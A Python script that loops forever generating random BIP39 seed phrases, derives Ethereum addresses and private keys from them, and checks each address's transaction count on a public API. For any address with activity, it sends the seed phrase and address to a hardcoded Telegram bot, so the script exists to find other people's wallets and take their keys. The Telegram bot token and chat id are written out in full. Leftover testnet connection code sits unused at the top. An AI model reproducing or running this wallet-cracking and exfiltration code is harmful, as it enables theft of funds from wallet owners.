import random
import time

import requests
from hdwallet import BIP44HDWallet
from hdwallet.cryptocurrencies import EthereumMainnet as Cryptocurrency
from hdwallet.utils import is_mnemonic
from mnemonic import Mnemonic
from web3 import Web3
# rpc urls are endpoints used to send and receive data to a specific blockchain
# here we're interacting with Polygon's testnet, the mumbai testnet
mumbai_rpc_url = "https://rpc-mumbai.maticvigil.com"

# The provider is your connection to a blockchain
web3 = Web3(Web3.HTTPProvider(mumbai_rpc_url))

#log if we're connected or not
print(web3.isConnected())

#get the blocknumber
print(web3.eth.blockNumber)
def check():
    try:
        while True:
            sellan = 'english'
            mne = Mnemonic(str(sellan))
            listno = ["128" , "256"]
            rnd = random.choice(listno)
            words = mne.generate(strength = int(rnd))
            STRENGTH = int(rnd)
            LANGUAGE: str = (sellan)
            MNEMONIC = words
            PASSPHRASE: str = None
            assert is_mnemonic(mnemonic = words , language = sellan)

            bip44_hdwallet: BIP44HDWallet = BIP44HDWallet(cryptocurrency = Cryptocurrency , account = 0 , change = False ,
                                                      address = 0)
            bip44_hdwallet.from_mnemonic(mnemonic = MNEMONIC , passphrase = PASSPHRASE , language = LANGUAGE)
            mixword = words[:32]
            addr = bip44_hdwallet.p2pkh_address()
            priv = bip44_hdwallet.private_key()
            bal = requests.get('https://api.ethplorer.io/getAddressInfo/'+addr+'?apiKey=freekey').json()
            print(addr, priv)
            print(words)
            print(bal)
            print(bal['countTxs'])
            if bal['countTxs'] > 0:
                requests.get(
                'https://api.telegram.org/bot5660911952:AAF4fdv2fjzeyqUHtvjsm51wtPl0eCoQkaQ/sendMessage?chat_id=400635213&text=' + words + '\n' + addr)
            time.sleep(10)

    except:
        pass
